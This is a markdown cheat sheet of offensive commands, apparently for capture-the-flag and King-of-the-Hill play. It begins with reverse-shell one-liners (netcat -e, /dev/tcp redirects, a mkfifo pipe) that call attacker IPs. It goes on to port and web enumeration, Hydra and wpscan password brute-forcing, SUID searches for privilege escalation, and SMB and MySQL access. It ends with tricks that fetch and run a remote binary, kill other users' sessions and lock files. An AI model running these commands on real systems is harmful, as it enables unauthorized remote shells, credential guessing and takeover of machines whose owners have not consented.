# Reverse_Shell ✅
```bash
nc 10.11.99.141 5555 -e bash
ncat 10.11.99.141 5555 -e bash
/bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
```
### [Other_Reverse_Shell_Site](https://www.revshells.com/)

# Enumeration ✅📚
## Nmap_Enumeration ✅
```bash
sudo nmap -p- <ip> -sV -T5
sudo nmap -p- <ip> -sV -T5 -Pn
sudo nmap 139,445 <ip> -sV -T5 --script=vuln
sudo nmap -p 139,445 <ip> -sV -T5 --script=vuln -Pn
```
## WEB_Enumeration ✅
### subdomains_enumeration ✡️
```bash
gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt —append-domain -t 100 --no-error 
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host:FUZZ.example.com" -fw 6
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
```
### directory _enumeration ✡️
```bash
nikto -h http://example.com

dirb http://example.com
dirb http://example.com -X .php,.html,.bak,.log,.txt,.zip,.enc

gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.html,.bak,.log,.txt,.zip,.enc

ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fc 500,404
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php,.html,.bak,.log,.txt,.zip,.enc

wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404,500 http://example.com/FUZZ
```
### *Wpscan ✡️
```bash
wpscan --url http://<adress>/ -e u (enum user)
wpscan --url http://<adress>/ -e ap (plugin)
```

# Brute Force Attack ✅📚
## Hydra Attack Type Cheat Sheet ✅
```bash
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
```
### Web_Method Brute Force ✅
```bash
nikto -h http://10.10.131.147:1234/manager/html -id bob:<password> (get-method)
wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-get /protected/ -I
hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
```
# Privilege-Escalation ✅📚
## SUID_SGID_Capabilities_Files_enumeration ✅
```
getcap -r / 2>/dev/null 
find /  -perm -04000 -ls 2>/dev/null
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
```
# service ✅📚
## SMB ✅
```bash
enum4linux -a
smbclient -L //<ip>/ -p <port>
smbget -R smb://<ip>/<share>
smbclient //<ip>/<share dir> 
smbclient //<ip>/<share dir> -p <port>
smbclient //<ip>/<share dir> -U Anonymous -p <port>
```
## MySQL ✅
### *enumeration ✡️
```bash
mysql -u root
mysql -u root -p
mysql -h <Hostname> -u root
```
### *MySQL commands ✡️
```mysql
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;
SELECT VERSION();
select * from <table>;

SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
```
# Other_useful_tricks ✅
## gpg command cheetsheet ✅
```bash
gpg --import key.gpg
gpg --import key.asc

gpg --batch --yes -d <file.gpg|pgp> -o secret.txt
gpg --batch --yes --passphrase 'passphrase' <file.gpg|pgp> 
```
## ICMP_listener ✅
```bash
sudo tshark -i any -f "icmp"
sudo tcpdump ip proto \\icmp -i tun0
```
# KoTH Tricks ✅
```bash
set write off
chattr +ai /root/king.txt
chattr -ai /root/king.txt
pkill -9 -t pts/1
set -o noclobber /root/king.txt
set +o noclobber /root/king.txt
sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null
echo "USERNAME" >| /root/king.txt

wget http://yourip/nyancat
chmod +x nyancat 
./nyancat > /dev/$pts

PATH=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```
